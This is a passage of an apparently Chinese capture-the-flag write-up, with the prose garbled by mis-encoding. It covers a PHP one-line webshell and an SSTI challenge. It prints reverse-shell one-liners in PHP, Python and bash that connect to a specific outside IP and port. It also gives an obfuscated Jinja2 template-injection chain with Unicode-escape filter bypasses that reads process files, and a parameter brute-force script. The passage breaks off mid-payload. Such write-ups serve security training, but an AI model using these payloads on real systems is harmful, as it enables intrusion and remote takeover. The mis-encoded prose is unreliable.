shell.php</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤çš„å¤§è‡´å†…å®¹ï¼šé¦–å…ˆåˆ›å»ºä¸€ä¸ªshell.phpï¼Œç„¶åå°†ä¸€å¥è¯æœ¨é©¬å†™å…¥shell.phpä¸­ã€‚å‘åŒ…ä¹‹åï¼Œè¿›å…¥shell.phpçš„é¡µé¢ï¼š</p><p><a href="https://pic.imgdb.cn/item/626688f9239250f7c59539cb.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688f9239250f7c59539cb.png"></a></p><p>ä¼ å…¥POSTå‚æ•°<code>shell=phpinfo();</code>æˆåŠŸè¿”å›phpinfoï¼æ¥ä¸‹æ¥èšå‰‘è¿æ¥å³å¯åœ¨æ ¹ç›®å½•å¤„æ‰¾åˆ°flagã€‚</p><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>ä»è¿‡æ»¤ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥å‡ºé¢˜äººæ˜¯æƒ³è¦é¿å…æˆ‘ä»¬åå¼¹shellçš„ï¼Œä½†æ˜¯æ”¾å¼€äº†phpï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpä¸€å¥è¯åå¼¹shellçš„ä»£ç æ¥getshellï¼š</p><p>phpä¸€å¥è¯åå¼¹shellï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;110.42.234.56&quot;,9200);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>æ“ä½œä¸ä¸Šè¿°ç±»ä¼¼ï¼Œå¾—åˆ°payloadä¹‹åï¼Œæ›´æ”¹<code>Upgrade-Insecure-Requests</code>ä¸ºè¿™å¥åå¼¹shellçš„ä»£ç ï¼Œåœ¨å‘åŒ…å‰ï¼Œç›‘å¬èµ·ç›¸åº”æœåŠ¡å™¨çš„ç›¸åº”ç«¯å£ï¼Œç„¶åå‘åŒ…å³å¯æˆåŠŸåå¼¹shellï¼š</p><p><a href="https://pic.imgdb.cn/item/62668908239250f7c5955d72.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668908239250f7c5955d72.png"></a></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ¬é¢˜çš„è§£ç»éä»…æœ‰è¿™ä¸¤ç§æ–¹æ³•ï¼Œæå‡ºè¿™ä¸¤ç§æ–¹æ³•æœ¬è´¨æ˜¯æƒ³è¦è¾¾åˆ°æŠ›ç –å¼•ç‰çš„ç›®çš„ï¼Œå¤§å®¶å¯ä»¥å†æ€è€ƒä¸€ä¸‹ï¼Œæœ‰æ²¡æœ‰æ›´ç®€å•çš„æ–¹æ³•ã€‚æ¯”å¦‚æœ¬é¢˜ä¸­ä½¿ç”¨çš„æ˜¯apacheï¼Œä¸”è®¿é—®æ—¥å¿—<strong>å¹¶æœª</strong>å¼€å¯ï¼Œä½†æ˜¯å‡å¦‚å¼€å¯çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥åœ¨headersä¸­ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åé€šè¿‡includeå°†apacheçš„è®¿é—®æ—¥å¿—access.logåŒ…å«è¿›æ¥ï¼Œä»è€Œè¾¾åˆ°getshellçš„ç›®çš„å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™äº›éœ€è¦å¤§å®¶è‡ªå·±å»éªŒè¯ã€‚</p><h2 id="difficult-ssti"><a href="#difficult-ssti" class="headerlink" title="difficult_ssti"></a>difficult_ssti</h2><p><strong>é¢˜ç›®è€ƒå¯Ÿå†…å®¹</strong>ï¼šå‚æ•°çˆ†ç ´+SSTI+evalå‡½æ•°åå¼¹shell</p><h3 id="è·å–çº¿ç´¢-2"><a href="#è·å–çº¿ç´¢-2" class="headerlink" title="è·å–çº¿ç´¢"></a>è·å–çº¿ç´¢</h3><p>æ‰“å¼€ç¯å¢ƒï¼Œæç¤ºâ€œå‘Šè¯‰ä½ ä¸€ä¸ªç§˜å¯†ï¼Œè¿™ä¸ªç½‘ç«™æœ‰ä¸ªsnertè·¯ç”±ï¼Œå¿«å»çœ‹çœ‹å§â€ã€‚è¿›å…¥&#x2F;snertï¼Œåˆæç¤ºæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªPOSTå‹å‚æ•°ï¼š</p><p><a href="https://pic.imgdb.cn/item/62668972239250f7c5964911.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668972239250f7c5964911.png"></a></p><p>ä½†æ˜¯ä¼ å…¥çš„å‚æ•°åå´å¹¶æœªå‘Šè¯‰æˆ‘ä»¬ã€‚å°è¯•çˆ†ç ´ç›®å½•ä¸æŠ“åŒ…ï¼Œä¹Ÿå¹¶æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„çº¿ç´¢ã€‚é‚£ä¹ˆç°åœ¨å”¯ä¸€çš„çº¿ç´¢å°±æ˜¯æ‰¾åˆ°è¿™ä¸ªå‚æ•°çš„å‚æ•°åï¼Œçˆ†ç ´è¿™ä¸ªå‚æ•°æœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œå¯ä»¥åˆ©ç”¨burpï¼Œè„šæœ¬ï¼Œæˆ–è€…å·¥å…·arjunæ¥çˆ†ç ´å‚æ•°ï¼ˆarjuné¡¹ç›®åœ°å€<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a>)ï¼š</p><p>è„šæœ¬å¾ˆå¥½å†™ï¼Œéšä¾¿è´´ä¸€ä¸ªå§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node1.snert.cn/snert&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_param</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;your_dict&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            data = &#123;line:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">            req = requests.post(url,data=data)</span><br><span class="line">            time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;ä¸€çœ¼é¡¶é’ˆï¼Œé‰´å®šä¸ºå‡&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;å‚æ•°ä¸ºï¼š&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(line))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_param()</span><br></pre></td></tr></table></figure><p>è„šæœ¬ä¸­æ‰“å¼€çš„æ–‡ä»¶æ˜¯æˆ‘ä»¬çš„å­—å…¸æ–‡ä»¶ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸æ”¾äº†ã€‚æ‹¿åˆ°å‚æ•°åä¸ºurlï¼Œæ¥ç€æˆ‘ä»¬å°è¯•ä¼ é€’urlå‚æ•°ä¸ºä¸åŒçš„å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å½“url=1æ—¶ï¼Œæç¤º`ä¸€çœ¼é¡¶é’ˆï¼Œé‰´å®šä¸ºçœŸï¼Œè¿™æ˜¯ä½ çš„urlå—ï¼š 1`ã€‚æˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œä¼šå°†æˆ‘ä»¬è¾“å…¥çš„urlå‚æ•°è¾“å‡ºå‡ºæ¥ã€‚é‚£æˆ‘ä»¬è®©url=&#123;&#123;1+1&#125;&#125;ï¼Œæç¤ºå¦‚ä¸‹ï¼š</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/62668986239250f7c5967974.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668986239250f7c5967974.png"></a></p><p>æˆ‘ä»¬fuzzä¸€ä¸‹å‘ç°è¿™é‡Œå¤§æ¦‚è¿‡æ»¤äº†è¿™äº›ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%1c&#x27;, &#x27;%1d&#x27;, &#x27;%1f&#x27;, &#x27;%1e&#x27;, &#x27;%20&#x27;, &#x27;%2b&#x27;, &#x27;%2c&#x27;, &#x27;%3c&#x27;, &#x27;%3e,&#x27;.&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;=&#x27;, &#x27;_&#x27;, &#x27;&#x27;&#x27;, &#x27;&quot;&quot;&#x27;, &#x27;\x&#x27;, &#x27;request&#x27;, &#x27;config&#x27;, &#x27;session&#x27;, &#x27;url_for&#x27;, &#x27;g&#x27;,&#x27;get_flashed_messages&#x27;, &#x27;*&#x27;, &#x27;for&#x27;, &#x27;if&#x27;, &#x27;format&#x27;, &#x27;list&#x27;, &#x27;lower&#x27;, &#x27;slice&#x27;,&#x27;striptags&#x27;, &#x27;trim&#x27;,&#x27;xmlattr&#x27;, &#x27;tojson&#x27;, &#x27;set&#x27;, &#x27;=&#x27;, &#x27;chr&#x27;</span><br><span class="line"></span><br><span class="line">å…¶ä¸­&#123;&#123;å’Œ&quot;&quot;è¿ç»­å°±è¢«è¿‡æ»¤ã€‚å…³äºâ€œ&#123;&#123;â€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨â€œ&#123;%%&#125;â€æ¥ç»•è¿‡ï¼Œåœ¨&#123;% %&#125;é‡Œé¢å¯ä»¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œåªè¦ä¸æŠ¥é”™å°±å¯ä»¥ã€‚æ¯”å¦‚è®©`url=&#123;%print(123)%&#125;`ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/62668993239250f7c5969f68.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668993239250f7c5969f68.png"></a></p><p>ç°åœ¨å°±å¯ä»¥è‚¯å®šï¼Œè¿™é‡Œå­˜åœ¨SSTIæ¼æ´ã€‚åˆ©ç”¨æ–¹å¼ä¸ä¸€èˆ¬çš„SSTIæ˜¯ä¸€æ ·çš„æ€è·¯ï¼Œä½†æ˜¯éœ€è¦å†™åœ¨printä¸­è¿›è¡Œæ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯<code>&#123;%print(æˆ‘ä»¬æ„é€ çš„pythoné“¾)%&#125;</code>ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜è¦æ³¨æ„ç»•è¿‡è¿‡æ»¤ã€‚</p><h3 id="ç»•è¿‡è¿‡æ»¤"><a href="#ç»•è¿‡è¿‡æ»¤" class="headerlink" title="ç»•è¿‡è¿‡æ»¤"></a>ç»•è¿‡è¿‡æ»¤</h3><p>è¿™é‡Œå°†â€.â€è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç»•è¿‡æ–¹å¼ï¼š<code>|attr(&quot;__class__&quot;)</code>ã€‚è¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼Œå…¶ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">åº”å½“æ˜¯</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">è€Œä¸ä»…ä»…æ˜¯|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]åŒç†</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œä¸‹åˆ’çº¿è¯¥æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿè¿™ä¹Ÿæ˜¯è¿™é“é¢˜ä¸­æœ€éš¾çš„åœ°æ–¹ã€‚é¦–å…ˆæˆ‘ä»¬ä¸èƒ½åˆ©ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡äº†ï¼Œå› ä¸ºè¿‡æ»¤\xï¼Œä½†æ˜¯ç›¸åŒçš„æ€è·¯ï¼Œæˆ‘ä»¬å¯ä¸å¯ä»¥åˆ©ç”¨Unicodeç¼–ç æ¥ç»•è¿‡å‘¢ï¼Ÿæ¯”å¦‚ï¼Œæˆ‘ä»¬å°†__class__æ¢ä¸€ä¸‹è¿™æ ·æ„é€ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>å›æ˜¾å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/626689a2239250f7c596c157.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689a2239250f7c596c157.png"></a></p><p>æˆåŠŸæ³¨å…¥ã€‚é‚£æ¥ä¸‹æ¥çš„æ€è·¯å°±å¾ˆç®€å•äº†ï¼ŒæŒ‰ç…§æˆ‘ä»¬ä¸€èˆ¬SSTIæ³¨å…¥æ–¹å¼è¿›è¡Œæ³¨å…¥ï¼ŒåŒæ—¶åˆ©ç”¨|attr(â€œ<strong>unicodeç¼–ç </strong>â€œ)è¿›è¡Œç»•è¿‡å³å¯ã€‚é€šè¿‡æŠ¥é”™ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç¯å¢ƒä½¿ç”¨çš„æ˜¯python3.10ï¼š</p><p><a href="https://pic.imgdb.cn/item/626689b8239250f7c596f51f.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689b8239250f7c596f51f.png"></a></p><p>æˆ‘ä»¬åˆ©ç”¨python3çš„æ³¨å…¥æ–¹å¼å°±å¯ä»¥äº†ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘åˆ©ç”¨<code>__builtins__</code> æ¨¡å—æ¥è¿›è¡Œæ‰§è¡Œå‘½ä»¤ã€‚åˆ©ç”¨ä¸‹é¢çš„ä»£ç å¯ä»¥åœ¨è‡ªå·±çš„python3ç¯å¢ƒä¸­çœ‹çœ‹å“ªäº›å­ç±»ä¸­å…·æœ‰<code>__builtins__</code> æ¨¡å—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(i.__init__.__globals__.keys())</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨<code>__builtins__</code>æ¨¡å—ä¸­çš„openå‡½æ•°ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼š</p><p>å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹pythoné“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;open&quot;)(&quot;/proc/self/cmdline&quot;))|attr(read))()%&#125;</span><br></pre></td></tr></table></figure><p>urlç¼–ç åï¼Œå¾—åˆ°payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(((((((((&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(80))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u006f\u0070\u0065\u006e&quot;)(&quot;\u002f\u0070\u0072\u006f\u0063\u002f\u0073\u0065\u006c\u0066\u002f\u0063\u006d\u0064\u006c\u0069\u006e\u0065&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;))()%&#125;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥å‚æ•°ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/62669e80239250f7c5cd0f61.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62669e80239250f7c5cd0f61.png"></a></p><p>æ¥ç€æŸ¥çœ‹app.pyï¼ŒæŸ¥çœ‹&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;app.pyæ–‡ä»¶å³å¯ï¼Œæ­¥éª¤ä¸ä¸Šè¿°ç±»ä¼¼ï¼Œæ‹¿åˆ°ç½‘ç«™æºç ï¼š</p><p><a href="https://pic.imgdb.cn/item/62669ec2239250f7c5ce15e1.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62669ec2239250f7c5ce15e1.png"></a></p><p>æˆ‘ä»¬å‘ç°è¿™é‡Œç«Ÿç„¶è¿˜è¿‡æ»¤äº†flagï¼Œpopenï¼Œsystemè¿™å‡ ä¸ªå­—ç¬¦ä¸²çš„unicodeç¼–ç ã€‚é€šè¿‡æºç å‘ç°ç½‘ç«™æ‰“å¼€äº†debugæ¨¡å¼ï¼Œäºæ˜¯è¿›å…¥&#x2F;consoleç›®å½•ï¼Œæƒ³ç€æ‹¿åˆ°Pinç ï¼Œè·å–æ§åˆ¶å°æƒé™ã€‚ï¼ˆ<a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug æ¨¡å¼ PIN ç ç”Ÿæˆæœºåˆ¶å®‰å…¨æ€§ç ”ç©¶ç¬”è®°</a>ï¼‰ä½†æ˜¯æŸ¥çœ‹&#x2F;etc&#x2F;passwdæ–‡ä»¶å‘ç°ï¼ŒæœåŠ¡å™¨æ²¡æœ‰è¿è¡Œflaskæ‰€ç™»å½•çš„ç”¨æˆ·åï¼Œå› ä¸ºå°è¯•å°†ç”¨æˆ·åè®¾ä¸ºrootå¾—åˆ°çš„Pinç å¹¶ä¸æ­£ç¡®ï¼Œä¸”æœåŠ¡å™¨ä¹Ÿæ²¡æœ‰å…¶ä»–å¯ä»¥ä½¿ç”¨çš„ç”¨æˆ·åï¼Œå› æ­¤è¿™ä¸ªåŠæ³•ä¹Ÿè¡Œä¸é€šã€‚</p><h3 id="SSTI-evalå‡½æ•°åå¼¹shell"><a href="#SSTI-evalå‡½æ•°åå¼¹shell" class="headerlink" title="SSTI+evalå‡½æ•°åå¼¹shell"></a>SSTI+evalå‡½æ•°åå¼¹shell</h3><p>æ—¢ç„¶è¿‡æ»¤äº†popenã€systemå’Œflagçš„unicodeç¼–ç ï¼Œé‚£å°±æ„å‘³ç€æˆ‘ä»¬æ— æ³•é€šè¿‡openå‡½æ•°æŸ¥çœ‹åˆ°flagï¼Œä¹Ÿæ— æ³•ä½¿ç”¨popenå’Œsystemè¿™ä¸¤ä¸ªå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚é‚£ä¹ˆè¿˜æœ‰æ²¡æœ‰åˆ«çš„æ–¹æ³•å¯ä»¥åå¼¹shellå‘¢ï¼Ÿå½“ç„¶æœ‰çš„ã€‚</p><p>è¿™æ˜¯popenå’Œsystemå‡½æ•°åˆ©ç”¨çš„pythonåå¼¹shellçš„ä»£ç ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your_ip&quot;,your_listening_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç éœ€è¦æ”¾åˆ°<code>os.system</code>æˆ–è€…<code>os.popen</code>ä¸­æ‰§è¡Œæ‰æˆåŠŸï¼Œå› ä¸ºå‰é¢æœ‰<code>python3 -c</code> è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²çš„æ„æ€æ˜¯åœ¨ç»ˆç«¯ä¸­ä½¿ç”¨python3è¿›è¡Œäº†ä¸€æ¬¡å‘½ä»¤æ‰§è¡Œï¼Œå…¶ä¸­-cçš„å«ä¹‰ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-c cmd : program passed in as string (terminates option list)</span><br></pre></td></tr></table></figure><p>popenå’Œsysteméƒ½æ˜¯ç›´æ¥çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œç±»ä¼¼äºç›´æ¥åœ¨ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ã€‚ä½†æ˜¯evalå‡½æ•°å¹¶ä¸æ˜¯è¿™æ ·ï¼Œevalå‡½æ•°è¿”å›ä¼ å…¥å­—ç¬¦ä¸²çš„è¡¨è¾¾å¼çš„ç»“æœã€‚å°±æ˜¯è¯´ï¼šå°†å­—ç¬¦ä¸²å½“æˆæœ‰æ•ˆçš„è¡¨è¾¾å¼ æ¥æ±‚å€¼ å¹¶ è¿”å›è®¡ç®—ç»“æœã€‚</p><p>æˆ‘ä»¬å°†ä¸Šé¢é‚£å¥pythonåå¼¹shellçš„ä»£ç è¿›è¡Œå¦‚ä¸‹å°è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> socket, subprocess, os</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;your_ip&quot;</span>, your_port))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>å‘ç°æ‰§è¡ŒæˆåŠŸï¼š</p><p><a href="https://pic.imgdb.cn/item/626689ca239250f7c5971e78.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689ca239250f7c5971e78.png"></a></p><p>é‚£æˆ‘ä»¬å†ç”¨evalå‡½æ•°è¯•è¯•ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">eval</span>(</span><br><span class="line">        <span class="string">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;110.42.234.56\&quot;,9200));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒåæŠ¥é”™ï¼š</p><p><a href="https://pic.imgdb.cn/item/626689f2239250f7c59779c9.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689f2239250f7c59779c9.png"></a></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°æ˜¯å®šä½åˆ°importæ—¶æŠ¥é”™ï¼Œç”±æ­¤æ€€ç–‘ï¼Œä¸èƒ½ä½¿ç”¨importï¼Œå¯»æ‰¾æ›¿æ¢æ–¹æ¡ˆä¸º<code>__import__</code>ã€‚åœ¨ä½¿ç”¨<code>__import__</code> å‰ï¼Œæˆ‘ä»¬è¦å…ˆçŸ¥é“<a href="https://blog.csdn.net/whatday/article/details/102748166">python3ä¸­importå’Œ__import__çš„åŒºåˆ«</a>ã€‚å…¶ä¸­__import__ ä¸ä¼šç»‘å®šå˜é‡ è¿™æ„å‘³ä»£ç ä¸­çš„æ¯ä¸ªå˜é‡ éƒ½è¦ç”¨__import__ æ¥ä»£æ›¿ä½¿ç”¨ã€‚çŸ¥é“è¿™ä¸ªä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¼–å†™å‡ºå¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">eval</span>(</span><br><span class="line">        <span class="string">&quot;__import__(&#x27;subprocess&#x27;).call(\&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/your_ip/your_listening_port 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x\&quot;,shell=True)&quot;</span>)</span><br></pre></td></tr></table></figure><p>åœ¨æµ‹è¯•æœºä¸Šæ‰§è¡Œï¼Œæ”»å‡»æœºä¸Šç›‘å¬ç›¸åº”ç«¯å£ï¼Œæ‰§è¡ŒæˆåŠŸï¼š</p><p><a href="https://pic.imgdb.cn/item/62668a31239250f7c59810fb.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a31239250f7c59810fb.png"></a></p><p>é‚£æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ­£å¼å°†SSTIä¸evalå‡½æ•°åå¼¹shellç›¸ç»“åˆï¼Œä¸Šé¢å¾—åˆ°çš„payloadä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 